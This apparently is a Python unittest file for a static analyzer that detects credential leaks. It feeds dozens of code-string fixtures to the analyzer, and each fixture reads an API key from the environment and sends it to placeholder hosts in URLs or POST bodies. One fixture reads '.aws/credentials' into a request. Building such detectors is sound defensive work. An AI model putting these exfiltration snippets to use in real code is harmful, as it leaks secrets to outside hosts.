"""Source-only call/return URL purpose and raw credential boundaries."""
import unittest
from test_qindun_certify import MODULE


class PythonUrlCallAuthTests(unittest.TestCase):
    def test_url_call_return_contracts(self):
        cases = [
            ("argument_void_positional", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target):\n    requests.get(target)\nfetch(url)", ["candidate"], False),
            ("argument_void_keyword", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target):\n    requests.get(target)\nfetch(target=url)", ["candidate"], False),
            ("argument_return_positional", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target):\n    return requests.get(target)\nfetch(url)", ["candidate"], False),
            ("argument_return_keyword", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target):\n    return requests.get(target)\nfetch(target=url)", ["candidate"], False),
            ("argument_body_is_raw", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef send(target):\n    requests.post(\"https://other.invalid\",data=target)\nsend(url)", ["confirmed"], False),
            ("argument_log", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target):\n    print(target)\n    return requests.get(target)\nfetch(url)", ["candidate"], True),
            ("argument_mixed", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target,body):\n    requests.get(target)\n    requests.post(\"https://other.invalid\",data=body)\nfetch(url,key)", ["candidate","confirmed"], False),
            ("default_capture", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target=url):\n    return requests.get(target)\nurl=key\nfetch()", ["candidate"], False),
            ("default_override", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target=url):\n    return requests.get(target)\nfetch(key)", ["confirmed"], False),
            ("url_factory", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://service.invalid/api?key={value}\"\nurl=build(key)\nrequests.get(url)", ["candidate"], False),
            ("url_factory_body", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://service.invalid/api?key={value}\"\nurl=build(key)\nrequests.post(\"https://other.invalid\",data=url)", ["confirmed"], False),
            ("url_factory_log", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://service.invalid/api?key={value}\"\nurl=build(key)\nrequests.get(url)\nprint(url)", ["candidate"], True),
            ("factory_twice_public_secret", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://service.invalid/api?key={value}\"\nfirst=build(\"public\")\nsecond=build(key)\nrequests.get(first)\nrequests.get(second)", ["candidate"], False),
            ("factory_twice_secret_public", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://service.invalid/api?key={value}\"\nfirst=build(key)\nsecond=build(\"public\")\nrequests.get(first)\nrequests.get(second)", ["candidate"], False),
            ("identity_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef identity(value):\n    return value\nrequests.get(identity(url))", ["candidate"], False),
            ("return_both_auth", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    if choose:\n        return f\"https://service.invalid/api?key={value}\"\n    return f\"https://other.invalid/api?token={value}\"\nrequests.get(build(key))", ["candidate"], False),
            ("return_mixed", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    if choose:\n        return f\"https://service.invalid/api?key={value}\"\n    return value\nrequests.get(build(key))", ["confirmed"], False),
            ("caller_overwrite", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target):\n    return requests.get(target)\nurl=key\nfetch(url)", ["confirmed"], False),
            ("callee_overwrite", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target):\n    target=key\n    return requests.get(target)\nfetch(url)", ["confirmed"], False),
            ("callee_transform", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch(target):\n    target += \"&dump=\"+key\n    return requests.get(target)\nfetch(url)", ["confirmed"], False),
            ("cache_auth_then_payload_url", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nraw=f\"https://service.invalid/api?dump={key}\"\ndef fetch(target):\n    requests.get(target)\nfetch(url)\nfetch(raw)", ["candidate","confirmed"], False),
            ("nested_forward", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef outer(target):\n    def inner(value):\n        return requests.get(value)\n    return inner(target)\nouter(url)", ["candidate"], False),
            ("request_roundtrip", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://service.invalid/api?key={value}\"\nreq=urllib.request.Request(build(key))\nresponse=urllib.request.urlopen(req)\nprint(response.url)", ["candidate"], True),
            ("credential_file", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://service.invalid/api?key={value}\"\nrequests.get(build(open(\".aws/credentials\").read()))", ["confirmed"], False),
            ("mapping", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://service.invalid/api?key={value}\"\nrequests.get(build({\"value\":key}))", ["confirmed"], False),
            ("changed_authority", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    return f\"https://{host}/api?key={value}\"\nrequests.get(build(key))", ["confirmed"], False),
            ("conditional_fallthrough", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    if choose:\n        return f\"https://service.invalid/?key={value}\"\nrequests.get(build(key))", ["confirmed"], False),
            ("bare_return_path", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    if choose:\n        return\n    return f\"https://service.invalid/?key={value}\"\nrequests.get(build(key))", ["confirmed"], False),
            ("generator_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef build(value):\n    yield \"public\"\n    return f\"https://service.invalid/?key={value}\"\nrequests.get(build(key))", ["confirmed"], False),
            ("async_return", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nasync def build(value):\n    return f\"https://service.invalid/?key={value}\"\nrequests.get(build(key))", ["confirmed"], False),
        ]
        for name, source, expected, output in cases:
            with self.subTest(name=name):
                hits, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNone(error)
                self.assertEqual(
                    sorted({h.disposition for h in hits
                            if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}), expected
                )
                self.assertEqual(
                    any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits), output
                )

